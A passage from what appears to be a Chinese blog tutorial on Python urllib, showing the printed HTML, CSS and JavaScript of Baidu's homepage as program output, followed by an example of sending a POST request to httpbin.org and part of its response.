class="attribute">-moz-transition</span>:none;<span class="attribute">-o-transition</span>:none&#125;\n[data-pmd] <span class="variable">.c-tabs-animation</span> <span class="variable">.c-tabs-tabcontent</span>&#123;transition:transform .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-webkit-transition</span>:transform .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-moz-transition</span>:transform .3s cubic-bezier(.7,0,.3,1);<span class="attribute">-o-transition</span>:transform .3s cubic-bezier(.7,0,.3,1);<span class="attribute">transform</span>:translate3d(0,0,0);<span class="attribute">-webkit-transform</span>:translate3d(0,0,0);<span class="attribute">-moz-transition</span>:translate3d(0,0,0);<span class="attribute">-o-transition</span>:translate3d(0,0,0)&#125;\n[data-pmd] <span class="variable">.c-scroll-wrapper</span>,[data-pmd] <span class="variable">.c-scroll-wrapper-new</span>&#123;position:relative;<span class="attribute">overflow</span>:hidden&#125;\n[data-pmd] <span class="variable">.c-scroll-wrapper-new</span> <span class="variable">.c-scroll-touch</span>&#123;padding-left:9px;<span class="attribute">padding-right</span>:9px&#125;\n[data-pmd] <span class="variable">.c-scroll-parent-gap</span>&#123;padding:0 .11rem 0 9px&#125;\n[data-pmd] <span class="variable">.c-scroll-parent-gap</span> <span class="variable">.c-scroll-element-gap</span>&#123;padding-right:.1rem&#125;\n[data-pmd] <span class="variable">.c-scroll-indicator-wrapper</span>&#123;text-align:center;<span class="attribute">height</span>:6px&#125;\n[data-pmd] <span class="variable">.c-scroll-indicator-wrapper</span> <span class="variable">.c-scroll-indicator</span>&#123;vertical-align:top&#125;\n[data-pmd] <span class="variable">.c-scroll-indicator</span>&#123;display:inline-block;<span class="attribute">position</span>:relative;<span class="attribute">height</span>:6px&#125;\n[data-pmd] <span class="variable">.c-scroll-indicator</span> <span class="variable">.c-scroll-dotty</span>&#123;position:absolute;<span class="attribute">width</span>:6px;<span class="attribute">height</span>:6px;<span class="attribute">border-radius</span>:50%;<span class="attribute">background-color</span>:#999&#125;\n[data-pmd] <span class="variable">.c-scroll-indicator</span> <span class="variable">.c-scroll-dotty-now</span>&#123;background-color:#999&#125;\n[data-pmd] <span class="variable">.c-scroll-indicator</span> span&#123;display:block;<span class="attribute">float</span>:left;<span class="attribute">width</span>:6px;<span class="attribute">height</span>:6px;<span class="attribute">border-radius</span>:50%;<span class="attribute">background-color</span>:#e1e1e1;<span class="attribute">margin-right</span>:.07rem&#125;\n[data-pmd] <span class="variable">.c-scroll-indicator</span> span:last-child&#123;margin-right:0&#125;\n[data-pmd] <span class="variable">.c-scroll-touch</span>&#123;position:relative;<span class="attribute">overflow-x</span>:auto;<span class="attribute">-webkit-overflow-scrolling</span>:touch;<span class="attribute">padding-bottom</span>:.3rem;<span class="attribute">margin-top</span>:-.3rem;<span class="attribute">-webkit-transform</span>:translateY(.3rem);<span class="attribute">transform</span>:translateY(.3rem)&#125;\n[data-pmd] <span class="variable">.c-location-wrap</span>&#123;overflow:hidden;<span class="attribute">padding</span>:0 .15rem;<span class="attribute">background-color</span>:#f7f7f7&#125;\n[data-pmd] <span class="variable">.c-location-header-tips</span>&#123;font-size:.13rem&#125;\n[data-pmd] <span class="variable">.c-location-header-btn</span>&#123;padding-top:.08rem;<span class="attribute">-webkit-box-flex</span>:0;<span class="attribute">-webkit-flex</span>:none&#125;\n[data-pmd] <span class="variable">.c-location-header-btn</span> div&#123;display:inline-block&#125;\n[data-pmd] <span class="variable">.c-location-header-btn-reload</span>:after&#123;content:\"\";<span class="attribute">display</span>:inline-block;<span class="attribute">overflow</span>:hidden;<span class="attribute">width</span>:1px;<span class="attribute">height</span>:.1rem;<span class="attribute">margin</span>:0 .08rem;<span class="attribute">background-color</span>:#ccc&#125;\n[data-pmd] <span class="variable">.c-location-header-btn-</span>788&#123;display:none&#125;\n[data-pmd] <span class="variable">.c-location-header-btn-in</span>,[data-pmd] <span class="variable">.c-location-header-btn-reload</span>&#123;color:#333&#125;\n[data-pmd] <span class="variable">.c-location-header-btn</span> <span class="variable">.c-icon</span>&#123;color:#666;<span class="attribute">vertical-align</span>:top&#125;\n[data-pmd] <span class="variable">.c-location-header-tips</span>&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-location-header-tips-err</span>&#123;color:#c00&#125;\n[data-pmd] <span class="variable">.c-location-header-tips-success</span>&#123;color:#38f&#125;\n[data-pmd] <span class="variable">.c-location-header-btn-reload-ing</span> <span class="variable">.c-location-header-btn-</span>787&#123;display:none&#125;\n[data-pmd] <span class="variable">.c-location-header-btn-reload-ing</span> <span class="variable">.c-location-header-btn-</span>788&#123;display:inline-block;<span class="attribute">color</span>:#999;<span class="attribute">-webkit-animation-name</span>:c_location_rotate;<span class="attribute">-webkit-animation-duration</span>:1.5s;<span class="attribute">-webkit-animation-iteration-count</span>:infinite;<span class="attribute">-webkit-animation-timing-function</span>:linear&#125;\n[data-pmd] <span class="variable">.c-location-header-btn-reload-ing</span>&#123;color:#999&#125;\n@-webkit-keyframes c_location_rotate&#123;\nfrom&#123;-webkit-transform:rotate(0)&#125;\nto&#123;-webkit-transform:rotate(360deg)&#125;\n&#125;\n@keyframes c_location_rotate&#123;\nfrom&#123;transform:rotate(0)&#125;\nto&#123;transform:rotate(360deg)&#125;\n&#125;\n[data-pmd] <span class="variable">.c-location-header-btn-in-active</span>,[data-pmd] <span class="variable">.c-location-header-btn-in-active</span> <span class="variable">.c-icon</span>&#123;color:#38f&#125;\n[data-pmd] <span class="variable">.c-location-form</span>&#123;position:relative&#125;\n[data-pmd] <span class="variable">.c-location-form</span> <span class="variable">.c-input</span>&#123;padding-right:.7rem&#125;\n[data-pmd] <span class="variable">.c-location-input-close</span>&#123;position:absolute;<span class="attribute">z-index</span>:10;<span class="attribute">top</span>:1px;<span class="attribute">right</span>:.37rem;<span class="attribute">display</span>:none;<span class="attribute">width</span>:.36rem;<span class="attribute">height</span>:.36rem;<span class="attribute">line-height</span>:.36rem;<span class="attribute">text-align</span>:center;<span class="attribute">color</span>:#ddd;<span class="attribute">font-size</span>:.16rem&#125;\n[data-pmd] <span class="variable">.c-location-form</span> <span class="variable">.c-input</span>:focus&#123;border-color:#ddd #eee #eee #ddd;<span class="attribute">background-color</span>:#fff&#125;\n[data-pmd] <span class="variable">.c-location-sub</span>&#123;position:absolute;<span class="attribute">z-index</span>:10;<span class="attribute">top</span>:1px;<span class="attribute">right</span>:1px;<span class="attribute">width</span>:.36rem;<span class="attribute">height</span>:.36rem;<span class="attribute">border-left</span>:1px solid #eee;<span class="attribute">line-height</span>:.36rem;<span class="attribute">text-align</span>:center;<span class="attribute">background-color</span>:#fafafa&#125;\n[data-pmd] <span class="variable">.c-location-body</span>&#123;display:none;<span class="attribute">padding-bottom</span>:.14rem&#125;\n[data-pmd] <span class="variable">.c-location-down</span>&#123;display:none;<span class="attribute">border</span>:1px solid #eee;<span class="attribute">border-top</span>:0;<span class="attribute">background-color</span>:#fff;<span class="attribute">-webkit-tap-highlight-color</span>:rgba(0,0,0,0)&#125;\n[data-pmd] <span class="variable">.c-location-down-tips</span>&#123;height:.38rem;<span class="attribute">padding-left</span>:.12rem;<span class="attribute">line-height</span>:.38rem;<span class="attribute">background-color</span>:#fafafa&#125;\n[data-pmd] <span class="variable">.c-location-down-tips-close</span>&#123;padding-right:.12rem&#125;\n[data-pmd] <span class="variable">.c-location-down-tips-close</span>:before&#123;content:\"\";<span class="attribute">display</span>:inline-block;<span class="attribute">width</span>:1px;<span class="attribute">height</span>:.1rem;<span class="attribute">margin-right</span>:.08rem;<span class="attribute">background-color</span>:#ddd&#125;\n[data-pmd] <span class="variable">.c-location-down</span> ul&#123;list-style:none&#125;\n[data-pmd] <span class="variable">.c-location-down</span> li&#123;padding:.04rem .12rem;<span class="attribute">border-top</span>:1px solid #eee&#125;\n[data-pmd] <span class="variable">.c-navs</span>&#123;position:relative&#125;\n[data-pmd] <span class="variable">.c-navs-bar</span>&#123;position:relative;<span class="attribute">min-width</span>:100%;<span class="attribute">height</span>:40px;<span class="attribute">white-space</span>:nowrap;<span class="attribute">display</span>:-webkit-box;<span class="attribute">-webkit-box-orient</span>:horizontal;<span class="attribute">-webkit-box-direction</span>:normal;<span class="attribute">-webkit-box-pack</span>:justify;<span class="attribute">-webkit-box-align</span>:stretch;<span class="attribute">-webkit-box-lines</span>:single;<span class="attribute">display</span>:-webkit-flex;<span class="attribute">-webkit-flex-direction</span>:row;<span class="attribute">-webkit-justify-content</span>:space-between;<span class="attribute">-webkit-align-items</span>:stretch;<span class="attribute">-webkit-align-content</span>:flex-start;<span class="attribute">-webkit-flex-wrap</span>:nowrap&#125;\n[data-pmd] <span class="variable">.c-navs</span> <span class="variable">.c-row-tile</span>&#123;border-bottom:1px solid #f1f1f1&#125;\n[data-pmd] <span class="variable">.c-navs-sub</span> <span class="variable">.c-navs-bar</span>&#123;height:38px&#125;\n[data-pmd] <span class="variable">.c-navs-bar</span> *&#123;-webkit-box-sizing:border-box;<span class="attribute">box-sizing</span>:border-box&#125;\n[data-pmd] <span class="variable">.c-navs-bar-li</span>&#123;display:block;<span class="attribute">-webkit-box-flex</span>:1;<span class="attribute">-webkit-flex</span>:1 1 auto;<span class="attribute">width</span>:16.66666667%;<span class="attribute">height</span>:40px;<span class="attribute">line-height</span>:40px;<span class="attribute">list-style</span>:none;<span class="attribute">text-decoration</span>:none;<span class="attribute">color</span>:#666;<span class="attribute">text-align</span>:center;<span class="attribute">font-size</span>:15px;<span class="attribute">-webkit-tap-highlight-color</span>:transparent;<span class="attribute">padding</span>:0 17px&#125;\n[data-pmd] <span class="variable">.c-navs-sub</span> <span class="variable">.c-navs-bar-li</span>&#123;height:38px;<span class="attribute">line-height</span>:38px&#125;\n[data-pmd] <span class="variable">.c-navs-bar-li</span> span&#123;height:100%;<span class="attribute">display</span>:inline-block;<span class="attribute">max-width</span>:100%;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">white-space</span>:nowrap;<span class="attribute">overflow</span>:hidden&#125;\n[data-pmd] <span class="variable">.c-navs-bar</span> <span class="variable">.c-navs-bar-selected</span> span&#123;color:#333;<span class="attribute">font-weight</span>:700;<span class="attribute">border-bottom</span>:2px solid #333&#125;\n[data-pmd] <span class="variable">.c-navs-bar-view</span>&#123;position:relative;<span class="attribute">overflow</span>:hidden&#125;\n[data-pmd] <span class="variable">.c-navs-bar-view</span> <span class="variable">.c-navs-bar</span>&#123;display:block&#125;\n[data-pmd] <span class="variable">.c-navs-bar-view</span> <span class="variable">.c-navs-bar</span> <span class="variable">.c-navs-bar-li</span>&#123;display:inline-block;<span class="attribute">width</span>:auto;<span class="attribute">padding</span>:0 17px&#125;\n[data-pmd] <span class="variable">.c-navs-bar-toggle</span>&#123;position:absolute;<span class="attribute">top</span>:0;<span class="attribute">right</span>:0;<span class="attribute">width</span>:34px;<span class="attribute">height</span>:40px;<span class="attribute">background-color</span>:#fff&#125;\n[data-pmd] <span class="variable">.c-navs-sub</span> <span class="variable">.c-navs-bar-toggle</span>&#123;height:38px&#125;\n[data-pmd] <span class="variable">.c-navs-bar-toggle</span> i&#123;width:0;<span class="attribute">height</span>:0;<span class="attribute">right</span>:17px;<span class="attribute">top</span>:17px;<span class="attribute">border-right</span>:5px solid transparent;<span class="attribute">border-top</span>:5px solid #999;<span class="attribute">border-left</span>:5px solid transparent;<span class="attribute">position</span>:absolute&#125;\n[data-pmd] <span class="variable">.c-navs-bar-layer</span>&#123;position:absolute;<span class="attribute">top</span>:0;<span class="attribute">z-index</span>:8;<span class="attribute">width</span>:100%;<span class="attribute">background-color</span>:#fff;<span class="attribute">overflow-x</span>:hidden&#125;\n[data-pmd] <span class="variable">.c-navs-bar-layer</span> p&#123;color:#999;<span class="attribute">padding</span>:9px 17px 13px&#125;\n[data-pmd] <span class="variable">.c-navs-sub</span> <span class="variable">.c-navs-bar-layer</span> p&#123;padding:8px 17px 13px&#125;\n[data-pmd] <span class="variable">.c-navs-bar-layer</span> <span class="variable">.c-row</span>&#123;margin-bottom:17px&#125;\n[data-pmd] <span class="variable">.c-navs-sub</span> <span class="variable">.c-navs-bar-toggle</span> i&#123;top:16px&#125;\n[data-pmd] <span class="variable">.c-navs-bar-layer</span> <span class="variable">.c-navs-bar-toggle</span> i&#123;border-right:5px solid transparent;<span class="attribute">border-bottom</span>:5px solid #999;<span class="attribute">border-left</span>:5px solid transparent;<span class="attribute">border-top</span>:0&#125;\n[data-pmd] <span class="variable">.c-navs-bar-layer</span> <span class="variable">.c-navs-bar-li</span>&#123;height:33px;<span class="attribute">line-height</span>:33px;<span class="attribute">text-align</span>:center;<span class="attribute">font-size</span>:14px;<span class="attribute">color</span>:#333;<span class="attribute">width</span>:33.33333333%;<span class="attribute">-webkit-box-flex</span>:4;<span class="attribute">-webkit-flex</span>:4 4 auto;<span class="attribute">padding-right</span>:1.55367232%;<span class="attribute">padding-left</span>:1.55367232%&#125;\n[data-pmd] <span class="variable">.c-navs-bar-layer</span> <span class="variable">.c-span</span>4<span class="variable">.c-navs-bar-li</span> span&#123;display:inline-block;<span class="attribute">width</span>:100%;<span class="attribute">border</span>:1px solid #f1f1f1;<span class="attribute">border-bottom</span>:1px solid #f1f1f1&#125;\n[data-pmd] <span class="variable">.c-navs-bar-layer</span> <span class="variable">.c-span</span>4<span class="variable">.c-navs-bar-selected</span> span&#123;border:2px solid #333;<span class="attribute">line-height</span>:31px&#125;\n[data-pmd] <span class="variable">.c-navs-shadow</span>&#123;right:34px;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:0;<span class="attribute">width</span>:10px;<span class="attribute">height</span>:40px;<span class="attribute">background</span>:-webkit-linear-gradient(left,rgba(255,255,255,0),#fff);<span class="attribute">background</span>:linear-gradient(to right,rgba(255,255,255,0),#fff)&#125;\n[data-pmd] <span class="variable">.c-navs-sub</span> <span class="variable">.c-navs-shadow</span>&#123;height:38px&#125;\n[data-pmd] <span class="variable">.c-navs-bar-mask</span>&#123;position:absolute;<span class="attribute">z-index</span>:7;<span class="attribute">top</span>:0;<span class="attribute">left</span>:0;<span class="attribute">background</span>:rgba(0,0,0,.65);<span class="attribute">height</span>:1024px;<span class="attribute">width</span>:100%&#125;\n[data-pmd] <span class="variable">.c-navs-sub</span> <span class="variable">.c-navs-bar-li</span> span&#123;border-bottom:0;<span class="attribute">font-size</span>:14px&#125;&lt;\/style&gt;    \n    ";</span><br><span class="line">        <span class="attribute">result_common_css = $(result_common_css);</span></span><br><span class="line"><span class="attribute">        result_common_css.attr("data-for","result");</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">        var index_css= $('head [index]');</span></span><br><span class="line"><span class="attribute">        var wrapper=$("#wrapper");</span></span><br><span class="line"><span class="attribute">        window.index_on=function()&#123;</span></span><br><span class="line"><span class="attribute">            index_css.insertAfter("meta</span>:eq(0)");</span><br><span class="line">            <span class="attribute">result_common_css.remove();</span></span><br><span class="line"><span class="attribute">            wrapper.show();</span></span><br><span class="line"><span class="attribute">            if(bds.su&amp;&amp;bds.su.U&amp;&amp;bds.su.U.homeInit)&#123;</span></span><br><span class="line"><span class="attribute">                bds.su.U.homeInit();</span></span><br><span class="line"><span class="attribute">            &#125;</span></span><br><span class="line"><span class="attribute">        &#125;;</span></span><br><span class="line"><span class="attribute">        window.index_off=function()&#123;</span></span><br><span class="line"><span class="attribute">            result_common_css.insertAfter("meta</span>:eq(0)");</span><br><span class="line">            <span class="attribute">wrapper.show();</span></span><br><span class="line"><span class="attribute">            index_css.remove();</span></span><br><span class="line"><span class="attribute">        &#125;;</span></span><br><span class="line"><span class="attribute">    &#125;)();</span></span><br><span class="line"><span class="attribute">    $(window).on("load",function() &#123;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">        var rand = Math.random();</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">        if(rand &lt; 0.01) &#123;</span></span><br><span class="line"><span class="attribute">            try &#123;</span></span><br><span class="line"><span class="attribute">            var baseUrl = "//www.baidu.com/nocache/fesplg/s.gif?log_type=hm&amp;type=uamonitor&amp;",</span></span><br><span class="line"><span class="attribute">                queryString = "";</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">            queryString += "&amp;c_ua=" + encodeURIComponent(navigator.userAgent);</span></span><br><span class="line"><span class="attribute">            queryString += "&amp;s_ua=" + encodeURIComponent(bds.comm.userAgent);</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">            var url=baseUrl+queryString,</span></span><br><span class="line"><span class="attribute">                img = new Image(),</span></span><br><span class="line"><span class="attribute">                img_rand="_LOG_"+new Date().getTime();</span></span><br><span class="line"><span class="attribute">            img.onload=function()&#123;</span></span><br><span class="line"><span class="attribute">                delete window[img_rand];</span></span><br><span class="line"><span class="attribute">            &#125;;</span></span><br><span class="line"><span class="attribute">            window[img_rand]=img;</span></span><br><span class="line"><span class="attribute">            img.src=url;</span></span><br><span class="line"><span class="attribute">            &#125; catch(e) &#123;&#125;;</span></span><br><span class="line"><span class="attribute">        &#125;</span></span><br><span class="line"><span class="attribute">    &#125;);</span></span><br><span class="line"><span class="attribute">    $.extend(&#123;</span></span><br><span class="line"><span class="attribute">        loadCss</span>: function (path) &#123;</span><br><span class="line">            var element = document<span class="variable">.createElement</span>("link");</span><br><span class="line">            <span class="attribute">element.setAttribute("rel", "stylesheet");</span></span><br><span class="line"><span class="attribute">            element.setAttribute("type", "text/css");</span></span><br><span class="line"><span class="attribute">            element.setAttribute("href", path);</span></span><br><span class="line"><span class="attribute">            document.getElementsByTagName("head")[0].appendChild(element);</span></span><br><span class="line"><span class="attribute">        &#125;,</span></span><br><span class="line"><span class="attribute">        loadJs</span>: function (path , ignoreedge) &#123;</span><br><span class="line">            var element = document<span class="variable">.createElement</span>('script');</span><br><span class="line">            <span class="attribute">element.setAttribute('type', 'text/javascript');</span></span><br><span class="line"><span class="attribute">            element.setAttribute('src', path);</span></span><br><span class="line"><span class="attribute">            element.setAttribute('defer', 'defer');</span></span><br><span class="line"><span class="attribute">            document.getElementsByTagName("head")[0].appendChild(element);    </span></span><br><span class="line"><span class="attribute">        &#125;</span></span><br><span class="line"><span class="attribute">    &#125;);</span></span><br><span class="line"><span class="attribute">    &lt;/script&gt;</span></span><br><span class="line"><span class="attribute">    &lt;script src="http</span>://ss<span class="variable">.bdimg</span><span class="variable">.com</span>/static/superman/js/min_super-6caf46858f<span class="variable">.js</span>"&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script type="text/javascript"&gt;var Cookie=&#123;set:function(e,t,o,i,s,n)&#123;document<span class="variable">.cookie</span>=e+"="+(n?t:escape(t))+(s?"; <span class="attribute">expires="+s.toGMTString()</span>:"")+(i?"; <span class="attribute">path="+i</span>:"; <span class="attribute">path=/")+(o?"; domain="+o</span>:"")&#125;,get:function(e,t)&#123;var o=document<span class="variable">.cookie</span><span class="variable">.match</span>(new RegExp("(^| )"+e+"=([^;]*)(;|$)"));<span class="attribute">return null!=o?unescape(o[2])</span>:t&#125;,clear:function(e,t,o)&#123;this<span class="variable">.get</span>(e)&amp;&amp;(document<span class="variable">.cookie</span>=e+"="+(t?"; <span class="attribute">path="+t</span>:"; <span class="attribute">path=/")+(o?"; domain="+o</span>:"")+";<span class="attribute">expires=Fri, 02-Jan-1970 00</span>:00:00 GMT")&#125;&#125;;!<span class="attribute">function()&#123;function save(e)&#123;var t=[];for(tmpName in options)options.hasOwnProperty(tmpName)&amp;&amp;"duRobotState"!==tmpName&amp;&amp;t.push('"'+tmpName+'"</span>:"'+options[tmpName]+'"');<span class="attribute">var o="&#123;"+t.join(",")+"&#125;";bds.comm.personalData?$.ajax(&#123;url</span>:"//www<span class="variable">.baidu</span><span class="variable">.com</span>/ups/submit/addtips/?product=ps&amp;tips="+encodeURIComponent(o)+"&amp;_r="+(new Date)<span class="variable">.getTime</span>(),success:function()&#123;writeCookie(),"function"==typeof e&amp;&amp;e()&#125;&#125;):(writeCookie(),"function"==typeof e&amp;&amp;setTimeout(e,0))&#125;function set(e,t)&#123;options[e]=t&#125;function get(e)&#123;return options[e]&#125;function writeCookie()&#123;if(options<span class="variable">.hasOwnProperty</span>("sugSet"))&#123;var e="0"==options<span class="variable">.sugSet</span>?"0":"3";<span class="attribute">clearCookie("sug"),Cookie.set("sug",e,document.domain,"/",expire30y)&#125;if(options.hasOwnProperty("sugStoreSet"))&#123;var e=0==options.sugStoreSet?"0"</span>:"1";<span class="attribute">clearCookie("sugstore"),Cookie.set("sugstore",e,document.domain,"/",expire30y)&#125;if(options.hasOwnProperty("isSwitch"))&#123;var t=&#123;0</span>:"2",1:"0",2:"1"&#125;,e=t[options<span class="variable">.isSwitch</span>];<span class="attribute">clearCookie("ORIGIN"),Cookie.set("ORIGIN",e,document.domain,"/",expire30y)&#125;if(options.hasOwnProperty("imeSwitch"))&#123;var e=options.imeSwitch;clearCookie("bdime"),Cookie.set("bdime",e,document.domain,"/",expire30y)&#125;&#125;function writeBAIDUID()&#123;var e,t,o,i=Cookie.get("BAIDUID");/FG=(\d+)/.test(i)&amp;&amp;(t=RegExp.$1),/SL=(\d+)/.test(i)&amp;&amp;(o=RegExp.$1),/NR=(\d+)/.test(i)&amp;&amp;(e=RegExp.$1),options.hasOwnProperty("resultNum")&amp;&amp;(e=options.resultNum),options.hasOwnProperty("resultLang")&amp;&amp;(o=options.resultLang),Cookie.set("BAIDUID",i.replace(/</span>:.*$/,"")+("undefined"!=typeof o?":SL="+o:"")+("undefined"!=typeof e?":NR="+e:"")+("undefined"!=typeof t?":FG="+t:""),"<span class="variable">.baidu</span><span class="variable">.com</span>","/",expire30y,!0)&#125;function clearCookie(e)&#123;Cookie<span class="variable">.clear</span>(e,"/"),Cookie<span class="variable">.clear</span>(e,"/",document<span class="variable">.domain</span>),Cookie<span class="variable">.clear</span>(e,"/","."+document<span class="variable">.domain</span>),Cookie<span class="variable">.clear</span>(e,"/","<span class="variable">.baidu</span><span class="variable">.com</span>")&#125;function reset(e)&#123;options=defaultOptions,save(e)&#125;var defaultOptions=&#123;sugSet:1,sugStoreSet:1,isSwitch:1,isJumpHttps:1,imeSwitch:0,resultNum:10,skinOpen:1,resultLang:0,duRobotState:"000"&#125;,options=&#123;&#125;,tmpName,expire30y=new Date;<span class="attribute">expire30y.setTime(expire30y.getTime()+94608e7);try&#123;if(bds&amp;&amp;bds.comm&amp;&amp;bds.comm.personalData)&#123;if("string"==typeof bds.comm.personalData&amp;&amp;(bds.comm.personalData=eval("("+bds.comm.personalData+")")),!bds.comm.personalData)return;for(tmpName in bds.comm.personalData)defaultOptions.hasOwnProperty(tmpName)&amp;&amp;bds.comm.personalData.hasOwnProperty(tmpName)&amp;&amp;"SUCCESS"==bds.comm.personalData[tmpName].ErrMsg&amp;&amp;(options[tmpName]=bds.comm.personalData[tmpName].value)&#125;try&#123;parseInt(options.resultNum)||delete options.resultNum,parseInt(options.resultLang)||"0"==options.resultLang||delete options.resultLang&#125;catch(e)&#123;&#125;writeCookie(),"sugSet"in options||(options.sugSet=3!=Cookie.get("sug",3)?0</span>:1),"sugStoreSet"in options||(options<span class="variable">.sugStoreSet</span>=Cookie<span class="variable">.get</span>("sugstore",0));<span class="attribute">var BAIDUID=Cookie.get("BAIDUID");"resultNum"in options||(options.resultNum=/NR=(\d+)/.test(BAIDUID)&amp;&amp;RegExp.$1?parseInt(RegExp.$1)</span>:10),"resultLang"in options||(options<span class="variable">.resultLang</span>=/SL=(\d+)/<span class="variable">.test</span>(BAIDUID)&amp;&amp;RegExp.$1?parseInt(RegExp.$1):0),"isSwitch"in options||(options<span class="variable">.isSwitch</span>=2==Cookie<span class="variable">.get</span>("ORIGIN",0)?0:1==Cookie<span class="variable">.get</span>("ORIGIN",0)?2:1),"imeSwitch"in options||(options<span class="variable">.imeSwitch</span>=Cookie<span class="variable">.get</span>("bdime",0))&#125;catch(e)&#123;&#125;window<span class="variable">.UPS</span>=&#123;writeBAIDUID:writeBAIDUID,reset:reset,get:get,set:set,save:save&#125;&#125;(),function()&#123;var e="http://s1<span class="variable">.bdstatic</span><span class="variable">.com</span>/r/www/cache/static/plugins/every_cookie_4644b13<span class="variable">.js</span>";("<span class="attribute">Mac68K"==navigator.platform||"MacPPC"==navigator.platform||"Macintosh"==navigator.platform||"MacIntel"==navigator.platform)&amp;&amp;(e="http</span>://s1<span class="variable">.bdstatic</span><span class="variable">.com</span>/r/www/cache/static/plugins/every_cookie_mac_82990d4<span class="variable">.js</span>"),setTimeout(function()&#123;$<span class="variable">.ajax</span>(&#123;url:e,cache:!0,dataType:"script"&#125;)&#125;,0);<span class="attribute">var t=navigator&amp;&amp;navigator.userAgent?navigator.userAgent</span>:"",o=document&amp;&amp;document<span class="variable">.cookie</span>?document<span class="variable">.cookie</span>:"",i=!!(t<span class="variable">.match</span>(/(msie [2-8])/i)||t<span class="variable">.match</span>(/windows.*safari/i)&amp;&amp;!t<span class="variable">.match</span>(/chrome/i)||t<span class="variable">.match</span>(/(linux.*firefox)/i)||t<span class="variable">.match</span>(/Chrome\/29/i)||t<span class="variable">.match</span>(/mac os x.*firefox/i)||o<span class="variable">.match</span>(/\bISSW=1/)||0==UPS<span class="variable">.get</span>("isSwitch"));<span class="attribute">bds&amp;&amp;bds.comm&amp;&amp;(bds.comm.supportis=!i,bds.comm.isui=!0),window.__restart_confirm_timeout=!0,window.__confirm_timeout=8e3,window.__disable_is_guide=!0,window.__disable_swap_to_empty=!0,window.__switch_add_mask=!0;var s="http</span>://s1<span class="variable">.bdstatic</span><span class="variable">.com</span>/r/www/cache/static/global/js/all_async_search_c83de98<span class="variable">.js</span>",n="/script";<span class="attribute">document.write("&lt;script src='"+s+"'&gt;&lt;"+n+"&gt;"),bds.comm.newindex&amp;&amp;$(window).on("index_off",function()&#123;$('&lt;div class="c-tips-container" id="c-tips-container"&gt;&lt;/div&gt;').insertAfter("#wrapper"),window.__sample_dynamic_tab&amp;&amp;$("#s_tab").remove()&#125;),bds.comm&amp;&amp;bds.comm.ishome&amp;&amp;Cookie.get("H_PS_PSSID")&amp;&amp;(bds.comm.indexSid=Cookie.get("H_PS_PSSID"));var a=$(document).find("#s_tab").find("a");a&amp;&amp;a.length&gt;0&amp;&amp;a.each(function(e,t)&#123;t.innerHTML&amp;&amp;t.innerHTML.match(/新闻/)&amp;&amp;(t.innerHTML="资讯",t.href="//www.baidu.com/s?rtt=1&amp;bsst=1&amp;cl=2&amp;tn=news&amp;word=",t.setAttribute("sync",!0))&#125;)&#125;();&lt;/script&gt;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">    </span></span><br><span class="line"><span class="attribute">    </span></span><br><span class="line"><span class="attribute">        &lt;script&gt;</span></span><br><span class="line"><span class="attribute">        if(bds.comm.supportis)&#123;</span></span><br><span class="line"><span class="attribute">            window.__restart_confirm_timeout=true;</span></span><br><span class="line"><span class="attribute">            window.__confirm_timeout=8000;</span></span><br><span class="line"><span class="attribute">            window.__disable_is_guide=true;</span></span><br><span class="line"><span class="attribute">            window.__disable_swap_to_empty=true;</span></span><br><span class="line"><span class="attribute">        &#125;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">	    if(typeof initPreload == "function")&#123;</span></span><br><span class="line"><span class="attribute">            initPreload(&#123;</span></span><br><span class="line"><span class="attribute">                'isui'</span>:true,</span><br><span class="line">                'index_form':"#form",</span><br><span class="line">                'index_kw':"#kw",</span><br><span class="line">                'result_form':"#form",</span><br><span class="line">                'result_kw':"#kw"</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            window._sp_async = undefined;</span><br><span class="line">        &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">                if(navigator.cookieEnabled)&#123;</span><br><span class="line">            document.cookie="NOJS=;expires=Sat, 01 Jan 2000 00:00:00 GMT";</span><br><span class="line">        &#125;</span><br><span class="line">                &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">        </span><br><span class="line">	&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure></p>
<h4 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h4><p>例如：<br>“http: //httpbin.org”是一个用于测试各种HTTP请求的网站，以POST方式访问该网站<br><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#与HTTP请求一起发送的数据</span></span><br><span class="line">param_dist=&#123;<span class="string">"key"</span>:<span class="string">"hello"</span>&#125;</span><br><span class="line"><span class="comment">#调用urlopen函数将字典类型数据转成字符串</span></span><br><span class="line">param_str=urllib.parse.urlencode(param_dist)</span><br><span class="line"><span class="comment">#将传输的数据封装成一个bytes对象</span></span><br><span class="line">param_datas=bytes(param_str,encoding='utf8')</span><br><span class="line"><span class="comment">#在urlopen函数中传入data参数值,表示将发送一个POST请求</span></span><br><span class="line">response=urllib.request.urlopen(<span class="string">"http://httpbin.org/post"</span>,data=param_datas)</span><br><span class="line"><span class="comment">#打印网站返回的响应内容</span></span><br><span class="line">print(response.read())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line">b'&#123;\n  <span class="string">"args"</span>: &#123;&#125;, \n  <span class="string">"data"</span>: <span class="string">""</span>, \n  <span class="string">"files"</span>: &#123;&#125;, \n  <span class="string">"form"</span>: &#123;\n    <span class="string">"key"</span>: <span class="string">"hello"</span>\n  &#125;, \n  <span class="string">"headers"</span>: &#123;\n    <span class="string">"Accept-Encoding"</span>: <span class="string">"identity"</span>, \n    <span class="string">"Content-Length"</span>: 